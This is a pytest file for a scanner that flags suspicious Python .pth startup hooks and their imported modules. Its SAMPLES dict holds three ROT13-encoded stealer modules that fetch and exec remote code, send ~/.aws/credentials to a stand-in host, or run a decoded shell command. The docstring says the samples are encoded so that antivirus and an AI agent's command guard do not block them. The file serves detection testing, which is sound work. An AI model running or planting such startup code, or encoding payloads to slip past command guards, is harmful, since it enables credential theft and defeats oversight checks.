"""python.pth-import-target: the module an executable .pth line imports (#3).

The stealer-shaped startup modules are stored ROT13-encoded and decoded at test time (see test_skillscan.py):
as plain text, antivirus quarantines test files that contain them, and the agent's command guard stalls on them.
"""
import base64
import codecs
import hashlib
from pathlib import Path

import pytest

from asca import pystartup, pthtargets
from asca.model import Severity

SAMPLES = {
    "downloader": "vzcbeg heyyvo.erdhrfg\nrkrp(heyyvo.erdhrfg.heybcra('uggcf://rknzcyr.vainyvq/c').ernq())\n",
    "cred_sender": "vzcbeg bf, fbpxrg\nqngn = bcra(bf.cngu.rkcnaqhfre('~/.njf/perqragvnyf')).ernq()\n"
                   "fbpxrg.perngr_pbaarpgvba(('rknzcyr.vainyvq', 443)).fraq(qngn.rapbqr())\n",
    "decode_run": "vzcbeg onfr64, fhocebprff\nfhocebprff.Cbcra(onfr64.o64qrpbqr('MJAbolObnD==').qrpbqr(), furyy=Gehr)\n",
}
VENV_PY = '"""Patches that are applied at runtime to the virtual environment."""\n\nimport os\nimport sys\n\n' \
          'VIRTUALENV_PATCH_FILE = os.path.join(__file__)\n'


def sample(name: str) -> str:
    return codecs.decode(SAMPLES[name], "rot13")


def _rec_hash(data: bytes) -> str:
    return "sha256=" + base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()


@pytest.fixture
def site(tmp_path):
    sp = tmp_path / "venv" / "lib" / "python3.12" / "site-packages"
    sp.mkdir(parents=True)
    return sp


def install(sp: Path, dist: str, files: dict[str, str], version="1.0", tamper: dict[str, str] | None = None):
    """Write files as pip would (listed in RECORD with their hash), then optionally rewrite some."""
    di = sp / f"{dist}-{version}.dist-info"
    di.mkdir()
    (di / "METADATA").write_text(f"Metadata-Version: 2.1\nName: {dist}\nVersion: {version}\n\n", encoding="utf-8")
    rows = []
    for rel, text in files.items():
        p = sp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
        rows.append(f"{rel},{_rec_hash(p.read_bytes())},{p.stat().st_size}")
    (di / "RECORD").write_text("\r\n".join(rows + [f"{di.name}/RECORD,,"]) + "\r\n", encoding="utf-8")
    for rel, text in (tamper or {}).items():
        (sp / rel).write_text(text, encoding="utf-8")


def run(sp):
    return [f for f in pystartup.audit([pystartup.Site(sp, "venv")], {}) if f.rule == "python.pth-import-target"]


@pytest.mark.parametrize("line,mods", [
    ("import _virtualenv", ["_virtualenv"]),
    ("import os; var = 'X'; enabled and __import__('_distutils_hack').add_shim(); ", ["os", "_distutils_hack"]),
    ("import sys; exec('import os\\n\\nif x:\\n try:\\n  import coverage\\n except:\\n  pass')", ["sys", "os", "coverage"]),
    ("import a.b as c, d; from e.f import g; importlib.import_module('h')", ["a", "d", "e", "h"]),
])
def test_imported_modules(line, mods):
    assert pthtargets.imported_modules(line) == mods


def test_standard_tooling_targets_pass(site):
    (site / "_virtualenv.pth").write_text("import _virtualenv\n", encoding="utf-8")
    (site / "_virtualenv.py").write_text(VENV_PY, encoding="utf-8")            # written by virtualenv, not pip
    install(site, "setuptools", {
        "distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, "
                                    "'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
        "_distutils_hack/__init__.py": "import sys, os\n\ndef add_shim():\n    pass\n"})
    assert run(site) == []


def test_impersonated_virtualenv_module_is_high(site):
    (site / "_virtualenv.pth").write_text("import _virtualenv\n", encoding="utf-8")
    (site / "_virtualenv.py").write_text("import os\nprint('hello')\n", encoding="utf-8")
    [f] = run(site)
    assert f.severity == Severity.HIGH and "nobody installed" in f.title and "borrowed" in f.detail


@pytest.mark.parametrize("name", sorted(SAMPLES))
def test_stealer_shaped_module_is_high_even_when_its_package_lists_it(site, name):
    install(site, "litellm", {"cook.pth": "import cook\n", "cook.py": sample(name)}, version="9.9.9")
    fs = run(site)
    assert [(f.severity, f.title.split(":")[0]) for f in fs] == [(Severity.HIGH, "Startup module downloads or runs code")]
    assert "litellm 9.9.9" in fs[0].detail


def test_module_changed_after_install_is_high(site):
    install(site, "setuptools", {"distutils-precedence.pth": "import os; __import__('_distutils_hack')\n",
                                 "_distutils_hack/__init__.py": "def add_shim():\n    pass\n"},
            tamper={"_distutils_hack/__init__.py": "def add_shim():\n    pass\nimport os\n"})
    [f] = [f for f in run(site)]
    assert f.title.startswith("Startup module changed after install") and f.severity == Severity.HIGH


def test_compiled_module_shadowing_the_source_is_high(site):
    (site / "_virtualenv.pth").write_text("import _virtualenv\n", encoding="utf-8")
    (site / "_virtualenv.py").write_text(VENV_PY, encoding="utf-8")
    (site / "_virtualenv.cpython-312-x86_64-linux-gnu.so").write_bytes(b"\x7fELF")
    [f] = run(site)
    assert f.title.startswith("Compiled startup module nobody installed") and "_virtualenv.py" in f.detail


def test_unowned_target_of_unknown_pth_is_medium(site):
    (site / "zz_tools.pth").write_text("import zz_boot\n", encoding="utf-8")
    (site / "zz_boot.py").write_text("X = 1\n", encoding="utf-8")
    [f] = run(site)
    assert f.severity == Severity.MEDIUM


def test_targets_outside_the_site_and_path_lines_are_ignored(site):
    (site / "paths.pth").write_text("/opt/somewhere\n../lib\n", encoding="utf-8")
    (site / "stdlib.pth").write_text("import os, sys; sys.flags\n", encoding="utf-8")
    assert run(site) == []


def test_current_coverage_pth_is_standard_but_appended_code_is_not():
    line = ("import sys; exec('import os\\n\\nif os.getenv(\"COVERAGE_PROCESS_START\") or os.getenv(\"COVERAGE_PROCESS_"
            "CONFIG\"):\\n try:\\n  import coverage\\n except:\\n  pass\\n else:\\n  coverage.process_startup(slug=\"pth\")')")
    assert pystartup._benign_pth("a1_coverage.pth", line)
    assert not pystartup._benign_pth("a1_coverage.pth", line + "; import zz")
    assert not pystartup._benign_pth("other.pth", line)


def test_module_found_through_the_pth_s_own_path_lines(site):
    """pywin32.pth adds win32/lib to sys.path, then imports pywin32_bootstrap from there."""
    install(site, "pywin32", {"pywin32.pth": "# .pth file for the PyWin32 extensions\nwin32\nwin32\\lib\nPythonwin\n"
                                             "import pywin32_bootstrap\n",
                              "win32/lib/pywin32_bootstrap.py": "import os\n"},
            tamper={"win32/lib/pywin32_bootstrap.py": "import os\nX = 1\n"})
    [f] = run(site)
    assert f.title.startswith("Startup module changed after install") and "win32/lib/pywin32_bootstrap.py" in f.title


def test_path_lines_leaving_site_packages_are_not_followed(site, tmp_path):
    (tmp_path / "elsewhere").mkdir()
    (tmp_path / "elsewhere" / "zz_far.py").write_text("X = 1\n", encoding="utf-8")
    (site / "far.pth").write_text("../../../../elsewhere\nimport zz_far\n", encoding="utf-8")
    assert run(site) == []


@pytest.mark.parametrize("ver,pth", [("1.26.1", "agent_framework_meta.pth"), ("1.26.2", "af_runtime_diag.pth")])
def test_agent_framework_stealer_releases_are_known_bad(site, ver, pth):
    install(site, "agent-framework", {pth: f"import {pth[:-4]}\n", f"{pth[:-4]}.py": "X = 1\n"}, version=ver)
    fs = pystartup.audit([pystartup.Site(site, "venv")], {})
    got = sorted((f.rule, f.severity) for f in fs)
    assert ("python.known-bad-package", Severity.CRITICAL) in got and ("python.known-bad-hook", Severity.CRITICAL) in got
    assert any("elastic.co" in f.remediation for f in fs if f.rule == "python.known-bad-package")


def test_agent_framework_clean_release_is_not_flagged(site):
    install(site, "agent-framework", {"agent_framework_meta/__init__.py": "X = 1\n"}, version="1.26.0")
    assert pystartup.audit([pystartup.Site(site, "venv")], {}) == []


def _debian_site(site, dpkg_dir, *, md5_of=None):
    """Debian/Ubuntu python3-setuptools layout: egg-info without RECORD, file md5s in dpkg's md5sums."""
    import hashlib
    line = ("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
            "enabled and __import__('_distutils_hack').add_shim(); \n")
    (site / "distutils-precedence.pth").write_text(line, encoding="utf-8")
    hack = site / "_distutils_hack" / "__init__.py"
    hack.parent.mkdir()
    hack.write_text("import sys, os\n\ndef add_shim():\n    pass\n", encoding="utf-8")
    egg = site / "setuptools-84.2.0.egg-info"
    egg.mkdir()
    (egg / "PKG-INFO").write_text("Metadata-Version: 2.1\nName: setuptools\nVersion: 84.2.0\n", encoding="utf-8")
    (egg / "top_level.txt").write_text("_distutils_hack\nsetuptools\n", encoding="utf-8")
    if dpkg_dir is not None:
        md5 = hashlib.md5((md5_of or hack.read_text(encoding="utf-8")).encode()).hexdigest()
        (dpkg_dir / "python3-setuptools.md5sums").write_text(
            f"{md5}  {str(hack.resolve()).lstrip('/')}\n", encoding="utf-8")
    return hack


def test_debian_distro_package_is_owned_via_dpkg(site, tmp_path, monkeypatch):
    dpkg = tmp_path / "dpkg"
    dpkg.mkdir()
    monkeypatch.setattr(pthtargets, "DPKG_INFO", dpkg)
    _debian_site(site, dpkg)
    assert run(site) == []


@pytest.mark.skipif(__import__("os").name != "posix", reason="dpkg paths are Linux-only")
def test_debian_distro_package_changed_after_install(site, tmp_path, monkeypatch):
    dpkg = tmp_path / "dpkg"
    dpkg.mkdir()
    monkeypatch.setattr(pthtargets, "DPKG_INFO", dpkg)
    _debian_site(site, dpkg, md5_of="the original content\n")
    [f] = run(site)
    assert f.title.startswith("Startup module changed after install") and "dpkg" in f.detail


def test_egg_info_top_level_claim_without_dpkg_counts_as_owned(site):
    _debian_site(site, None)                     # e.g. an RPM distro: no dpkg, no RECORD
    assert run(site) == []
